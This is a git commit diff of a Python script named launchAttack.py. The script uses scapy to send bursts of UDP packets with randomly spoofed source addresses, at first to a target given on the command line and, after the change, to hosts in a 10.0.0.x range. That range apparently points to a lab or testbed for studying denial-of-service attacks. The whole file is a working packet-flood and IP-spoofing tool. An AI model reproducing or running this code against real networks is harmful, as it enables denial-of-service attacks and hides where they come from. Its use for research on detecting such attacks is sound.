ee3f5339a4f0a23530dcfcb6b7ec19d7444fdb4b
raghavbahuguna <57140326+raghavbahuguna@users.noreply.github.com>
2021-06-25 12:58:22 +0530

    Update launchAttack.py

--- launchAttack.py
+++ launchAttack.py
@@ -1,49 +1,57 @@
-import sys
-import time
 from os import popen
 import logging
 
-
-from scapy.all import *
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
+from scapy.all import *
 from random import randrange
-import time
+
 
 def sourceIPgen():
-    not_valid = [10,127,254,255,1,2,169,172,192]
-    first = randrange(1,256)
+    not_valid = {10, 127, 254, 1, 2, 169, 172, 192}
 
+    first = randrange(1,256)
     while first in not_valid:
-      first = randrange(1,256)
-    ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
+        first = randrange(1,256)
+
+    ip = ".".join([str(first),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
 
     return ip
 
-def main():
-  for i in range (1,5):
-    mymain()
-    time.sleep (10)
 
-def mymain():
-  #getting the ip address to send attack packets 
-  dstIP = sys.argv[1:]
-  src_port = 80
-  dst_port = 1
+def gendest(start, end):
 
-  # open interface eth0 to send packets
-  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
+    ip = ".".join(["10","0","0",str(randrange(start,end))])
+    return ip
 
-  for i in xrange(0,1000):
-    # form the packet
-    packets = Ether()/IP(dst=dstIP,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
 
-    # send packet with the defined interval (seconds) 
-    sendp( packets,iface=interface.rstrip(),inter=0.025)
+def mymain(argv):
+    try:
+        opts, args = getopt.getopt(sys.argv[1:],'s:e:',['start=','end='])
+    except getopt.GetoptError:
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt =='-s':
+            start = int(arg)
+        elif opt =='-e':
+            end = int(arg)
+    if start == '':
+        sys.exit()
+    if end == '':
+        sys.exit()
 
-if __name__=="__main__":
-  main()
 
+    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
+
+    for i in xrange(0,500):
+        ip_dst = gendest(start, end)
+        ip_src = sourceIPgen()
+        packets = Ether()/IP(dst=ip_dst,src=ip_src)/UDP(dport=80,sport=2)
+        print(ip_src + "-->" + ip_dst)
+
+        sendp( packets,iface=interface.rstrip(),inter=0.025)
+
+if __name__ == '__main__':
+  mymain(sys.argv)
